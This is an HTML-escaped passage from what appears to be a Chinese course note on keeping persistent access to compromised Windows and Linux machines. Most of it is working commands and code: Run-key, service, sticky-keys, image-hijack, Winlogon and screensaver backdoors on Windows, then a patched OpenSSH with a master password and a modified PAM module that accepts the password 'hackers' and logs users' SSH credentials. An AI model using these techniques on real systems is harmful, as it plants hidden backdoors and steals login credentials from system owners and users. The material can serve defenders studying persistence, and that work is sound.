&amp;#x27;8443&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;win-权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#win-权限维持&#34;&gt;#&lt;/a&gt; win 权限维持&lt;/h3&gt;
&lt;h4 id=&#34;自启动&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#自启动&#34;&gt;#&lt;/a&gt; 自启动&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;自启动路径加载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自启动服务加载&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;sc create ServiceTest binPath= C:\xd.exe start= auto&lt;br&gt;
sc delete ServiceTest&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;自启动注册表加载&lt;/li&gt;
&lt;/ul&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当前用户键值&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;服务器键值（需要管理员权限）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;添加启动项&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;REG ADD &amp;quot;HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&amp;quot; /V &amp;quot;backdoor&amp;quot; /t REG_SZ /F /D &amp;quot;C:\xd.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ul&gt;
&lt;li&gt;计划计时任务 参考前面横向移动课程&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;粘滞键&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#粘滞键&#34;&gt;#&lt;/a&gt; 粘滞键&lt;/h4&gt;
&lt;p&gt;系统自带的辅助功能进行替换执行，放大镜，旁白，屏幕键盘等均可。基本没用了。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;粘滞键位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;c:\windows\system32\sethc.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;move sethc.exe sethc1.exe&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;copy cmd.exe sethc.exe&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;映像劫持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#映像劫持&#34;&gt;#&lt;/a&gt; 映像劫持&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;测试：执行notepad成cmd&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;REG ADD &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&amp;quot; /v debugger /t REG_SZ /d &amp;quot;C:\Windows\System32\cmd.exe /c calc&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;配合GlobalFlag隐藏：执行正常关闭后触发&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg add &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ImageFile Execution Options\notepad.exe&amp;quot; /v GlobalFlag /t REG_DWORD /d 512&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg add &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&amp;quot; /v ReportingMode /t REG_DWORD /d 1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg add &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&amp;quot; /v MonitorProcess /d &amp;quot;C:\xd.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;屏保与登录&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#屏保与登录&#34;&gt;#&lt;/a&gt; 屏保与登录&lt;/h4&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;WinLogon配合无文件落地上线&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;REG ADD &amp;quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;quot; /V &amp;quot;Userinit&amp;quot; /t REG_SZ /F /D &amp;quot;C:\xd.exe&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;屏幕保护生效后执行后门&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;reg add &amp;quot;HKEY_CURRENT_USER\Control Panel\Desktop&amp;quot; /v SCRNSAVE.&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EXE /t REG_SZ /d &amp;quot;C:\xd.exe&amp;quot; /f&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;linux权限维持&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#linux权限维持&#34;&gt;#&lt;/a&gt; linux 权限维持&lt;/h3&gt;
&lt;h4 id=&#34;openssh版本后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#openssh版本后门&#34;&gt;#&lt;/a&gt; OpenSSH 版本后门&lt;/h4&gt;
&lt;p&gt;替换本身操作系统的 ssh 协议支撑软件 openssh，重新安装自定义的 openssh, 达到记录帐号密码，也可以采用万能密码连接的功能。更隐秘的方法可以做版本修改及文件修改时间处理。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;参考链接：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://www.cnblogs.com/csnd/p/11807653.html&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;https://mp.weixin.qq.com/s/BNrJHUs9qxEVHNSFEghaRw&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;环境准备：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yum -y install openssl openssl-devel pam-devel zlib zlib-devel&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yum -y install gcc gcc-c++ make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://mirror.aarnet.edu.au/pub/OpenBSD/OpenSSH/portable/openssh-5.9p1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xzvf openssh-5.9p1.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -xzvf 0x06-openssh-5.9p1.patch.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd openssh-5.9p1 &amp;amp;&amp;amp; patch &amp;lt; sshbd5.9p1.diff&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim version.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编辑密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim includes.h&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;177 #define ILOG &amp;quot;/tmp/ilog&amp;quot;#ILOG是别人用ssh登录该主机记录的日志&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;178 #define OLOG &amp;quot;/tmp/olog&amp;quot;#OLOG是该主机用ssh登录其他主机记录的日志目录&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;179 #define SECRETPW &amp;quot;xiaodi&amp;quot;#万能密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;180 #endif /* INCLUDES_H */&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装编译：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 &amp;amp;&amp;amp; make &amp;amp;&amp;amp; make install&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;service sshd restart #重启sshd服务&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;systemctl status sshd.service #查看ssh启动状态&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可以采用万能密码登录 、实现监控服务器登录登出的账号密码（发到外网）&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ssh-pam后门&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh-pam后门&#34;&gt;#&lt;/a&gt; SSH PAM 后门&lt;/h4&gt;
&lt;p&gt;PAM 是一种认证模块，PAM 可以作为 Linux 登录验证和各类基础服务的认 证，简单来说就是一种用于 Linux 系统上的用户身份验证的机制。进行认证时 首先确定是什么服务，然后加载相应的 PAM 的配置文件 (位于 /etc/pam.d)，最后 调用认证文件 (于 /lib/security) 进行安全认证。简易利用的 PAM 后门也是通过修改 PAM 源码中认证的逻辑来达到权限维持。&lt;/p&gt;
&lt;p&gt;参考链接：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvNzkwMg==&#34;&gt;https://xz.aliyun.com/t/7902&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;获取目标系统使用的 PAM 版本，下载对应版本的 pam 版本。解压缩，改 p am_unix_auth.c 文件，添加万能密码。编译安装 PAM。编译完后的文件在:mo dules/pam_unix/.libs/pam_unix.so，复制到 /lib64/security 中进行替换，即使用万 能密码登陆，将用户名密码记录到文件中。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;配置环境&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;关闭selinux&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;setenforce 0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查询版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rpm -qa | grep pam&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装此版本&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://www.linux-pam.org/library/Linux-PAM-1.1.8.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解压&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tar -zxvf Linux-PAM-1.1.8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装依赖&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;yum install gcc flex flex-devel -y&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改配置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;留PAM后门和保存SSH登录的账号密码&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;修改 Linux-PAM-1.1.8/modules/pam_unix/pam_unix_auth.c180 行/* verify the password of this user */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;retval = _unix_verify_password(pamh, name, p, ctrl);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(strcmp(&amp;quot;hackers&amp;quot;,p)==0)&amp;#123;return PAM_SUCCESS;&amp;#125; //后门密码&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;if(retval == PAM_SUCCESS)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;FILE * fp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fp = fopen(&amp;quot;/tmp/.sshlog&amp;quot;, &amp;quot;a&amp;quot;);//SSH登录用户密码保存位置&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fprintf(fp, &amp;quot;%s : %s\n&amp;quot;, name, p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;fclose(fp);&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name = p = NULL;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;AUTH_RETURN;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;安装并备份&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;编译安装：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./configure &amp;amp;&amp;amp; make&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;备份原有pam_unix.so，防止出现错误登录不上，复制新PAM模块到/lib64/security/目录下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp /usr/lib64/security/pam_unix.so /tmp/pam_unix.so.bakcp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cp Linux-PAM-1.1.8/modules/pam_unix/.libs/pam_unix.so /usr/lib64/security/pam_unix.so&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h4 id=&#34;ssh软链接&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ssh软链接&#34;&gt;#&lt;/a&gt; SSH 软链接&lt;/h4&gt;
&lt;p&gt;在 sshd 服务配置启用 PAM 认证的前提下，PAM 配置文件中控制标志为 sufficient 时，只要 pam_rootok 模块检测 uid 为 0 （root）即可成功认证登录。重启之后会失效，而且会多出来一个端口。&lt;/p&gt;
